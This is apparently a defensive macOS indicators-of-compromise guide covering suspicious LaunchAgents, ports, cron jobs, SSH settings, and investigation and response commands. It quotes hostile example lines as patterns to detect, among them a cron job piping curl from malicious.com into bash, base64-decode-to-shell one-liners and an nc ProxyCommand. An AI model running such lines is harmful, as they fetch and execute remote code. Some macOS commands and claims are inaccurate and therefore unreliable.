# Red Flags - Specific Indicators of Compromise

This document lists specific indicators that strongly suggest system compromise or security issues on macOS systems.

## 🚨 Critical Indicators (Act Immediately)

### Known Malware Signatures

#### Wlan.Software Family
**File patterns to watch for:**
- `com.Wlan.Software.plist`
- `com.wlan.Software.plist`
- `com.WLan.Software.plist`
- Any variant of "Wlan.Software" in LaunchAgents

**Characteristics:**
- Disguised as wireless software
- Often includes Base64 encoded payloads
- Creates persistent backdoor access
- May download additional payloads

#### OSX/Shlayer Variants
**File patterns:**
- References to `/tmp/` execution
- Base64 encoded AppleScript
- Shell scripts that download additional components
- LaunchAgents that run from `/Users/Shared/`

### Suspicious Launch Agent Patterns

#### Generic Names (High Risk)
```
com.update.plist
com.install.plist
com.helper.plist
com.service.plist
com.launcher.plist
com.agent.plist
com.system.plist
```

#### Typosquatting Apple Services
```
com.appl.update              (missing 'e')
com.apple.updte              (missing 'a')
com.applee.update            (extra 'e')
com.appe.update              (missing 'l')
```

#### Base64 Encoded Payloads
**Red flags in plist files:**
```xml
<string>/bin/sh</string>
<string>-c</string>
<string>echo "base64string" | base64 -d | sh</string>
```

### Network Indicators

#### Known Malicious Ports
- **4444, 4445** - Common reverse shell ports
- **31337, 1337** - Hacker culture ports
- **6666, 6667** - Often used for IRC command and control
- **8080, 8888** - Alternative HTTP, often used by malware

#### Suspicious Network Patterns
- Multiple connections to the same IP on different ports
- Connections to IP addresses instead of domain names
- High port numbers (>50000) with unknown services
- IRC connections when you don't use IRC

### File System Indicators

#### Suspicious File Locations
```
/tmp/                        # Temporary files (malware staging)
/var/tmp/                    # Another temp location
/Users/Shared/               # Accessible to all users
/Library/Application Support/[random] # Hidden malware folders
/usr/local/bin/[suspicious]  # System-level executables
```

#### Suspicious File Names
- Random character strings (e.g., `xvfb-run`, `miner`, `xmrig`)
- Misspelled system tools (`curlx`, `wgett`, `bashh`)
- Hidden files starting with `.` in unusual locations

---

## ⚠️ Warning Indicators (Investigate Immediately)

### Persistence Mechanisms

#### Kernel Extensions (Kexts)
**High risk kexts:**
- `Realtek*` - Often associated with malware
- `HoRNDIS` - USB tethering, frequently exploited
- Any unsigned kext on macOS Catalina+
- Kexts from unknown developers

#### Cron Jobs
**Suspicious patterns:**
```bash
# Downloads and executes scripts
* * * * * curl -s http://malicious.com/script.sh | bash

# Executes hidden scripts
0 */6 * * * /usr/local/bin/.hidden-script

# Base64 encoded commands
*/5 * * * * echo "base64string" | base64 -d | sh
```

### SSH Security Issues

#### Authorized Keys Red Flags
- Keys with no identifying comment
- Keys added recently you didn't add
- Multiple keys from the same source
- Keys with suspicious comments like:
  ```
  user@localhost
  root@host
  backup@system
  ```

#### SSH Configuration Issues
```bash
# Suspicious port forwards
LocalForward 8080 internal.company.com:80
RemoteForward 9999 localhost:22

# Suspicious proxy commands
ProxyCommand nc -X connect -x proxy.suspicious.com:1080 %h %p

# Automatic command execution
Match Host *
    RemoteCommand /tmp/malicious-script
```

### Process Indicators

#### Cryptocurrency Miners
**Common names:**
- `xmrig`, `minerd`, `cpuminer`
- `crypto-note`, `monero`, `zcash`
- High CPU processes with random names
- Processes connecting to mining pools

#### Backdoors and Remote Access
- Processes listening on unusual ports
- Unknown SSH/VNC/RDP services
- Processes with names like:
  - `backdoor`, `reverse`, `shell`
  - `rat`, `trojan`, `bot`

---

## 🟡 Suspicious Indicators (Need Investigation)

### Configuration Changes

#### Security Feature Modifications
- System Integrity Protection (SIP) disabled
- Gatekeeper disabled or bypassed
- Firewall completely disabled
- Unsigned code execution allowed

#### Unexpected Remote Access
- Screen Sharing enabled without your knowledge
- Remote Login (SSH) suddenly enabled
- File Sharing enabled with public access
- Unknown VPN configurations

### Recent System Changes

#### Unexpected Software Installations
- New applications you didn't install
- Development tools on non-development machines
- Network monitoring tools
- Virtualization software you don't use

#### Configuration Profile Issues
- Profiles from unknown organizations
- Profiles that can't be removed
- Profiles installing root certificates
- Profiles modifying security settings

---

## 🔍 Investigation Techniques

### For Suspicious Files

1. **Check File Metadata**
   ```bash
   stat /path/to/suspicious/file
   mdls /path/to/suspicious/file
   file /path/to/suspicious/file
   ```

2. **Examine File Contents**
   ```bash
   strings /path/to/suspicious/file | head -20
   hexdump -C /path/to/suspicious/file | head -10
   ```

3. **Check Digital Signature**
   ```bash
   codesign -dv /path/to/suspicious/file
   spctl --assess --verbose /path/to/suspicious/file
   ```

### For Suspicious Network Activity

1. **Identify Process Using Port**
   ```bash
   sudo lsof -i :PORTNUMBER
   sudo netstat -tulpn | grep PORTNUMBER
   ```

2. **Monitor Network Activity**
   ```bash
   sudo tcpdump -i any -n host SUSPICIOUS_IP
   sudo netstat -c  # Continuous monitoring
   ```

3. **Check DNS Lookups**
   ```bash
   sudo dscacheutil -flushcache
   sudo dscacheutil -q host -a name suspicious.domain.com
   ```

### For Suspicious Processes

1. **Get Process Details**
   ```bash
   ps aux | grep SUSPICIOUS_PROCESS
   lsof -p PID  # Files opened by process
   ```

2. **Check Process Tree**
   ```bash
   pstree -p PID
   ps -ef | grep PPID  # Parent process
   ```

---

## 🚨 Immediate Response Actions

### If You Confirm Compromise

1. **Isolate the System**
   - Disconnect from network immediately
   - Turn off WiFi and unplug ethernet

2. **Document Everything**
   - Take screenshots of findings
   - Save all diagnostic output
   - Record exact times and symptoms

3. **Don't Destroy Evidence**
   - Don't delete suspicious files yet
   - Don't reboot the system
   - Don't run cleanup tools

4. **Contact Security**
   - Notify IT security team (corporate)
   - Contact incident response team
   - Report to local authorities if necessary

### Emergency Commands

**Disable network interfaces:**
```bash
sudo ifconfig en0 down     # Disable ethernet
sudo ifconfig en1 down     # Disable wifi
```

**Kill suspicious processes:**
```bash
sudo kill -9 PID           # Force kill process
sudo killall ProcessName   # Kill by name
```

**Block network access for process:**
```bash
sudo pfctl -f /etc/pf.conf  # Enable firewall rules
```

---

## 📊 Risk Scoring Matrix

| Indicator Type | Low Risk | Medium Risk | High Risk | Critical Risk |
|---------------|----------|-------------|-----------|---------------|
| **Files** | Unknown files in user folders | Files in system folders | Base64 encoded executables | Known malware signatures |
| **Network** | Unknown outbound connections | Unusual listening ports | Connections to suspicious IPs | Backdoor communication |
| **Processes** | Unknown user processes | High resource usage | Hidden/obfuscated processes | Known malware names |
| **Config** | Minor setting changes | Disabled security features | Unknown admin accounts | Root compromise indicators |

---

## 🔗 Additional Resources

### Online Threat Intelligence
- [VirusTotal](https://virustotal.com) - File and URL analysis
- [AlienVault OTX](https://otx.alienvault.com) - Threat intelligence
- [Malware Bazaar](https://bazaar.abuse.ch) - Malware samples

### macOS Security References
- [Apple Security Updates](https://support.apple.com/HT201222)
- [macOS Security Guide](https://support.apple.com/guide/security/)
- [NIST macOS Security](https://www.nist.gov/publications/macos-security-compliance-project)

### Incident Response
- [SANS Incident Response](https://www.sans.org/white-papers/1901/)
- [NIST Incident Response Guide](https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-61r2.pdf)

Remember: When in doubt, treat it as suspicious and investigate further. It's better to be overly cautious with security matters.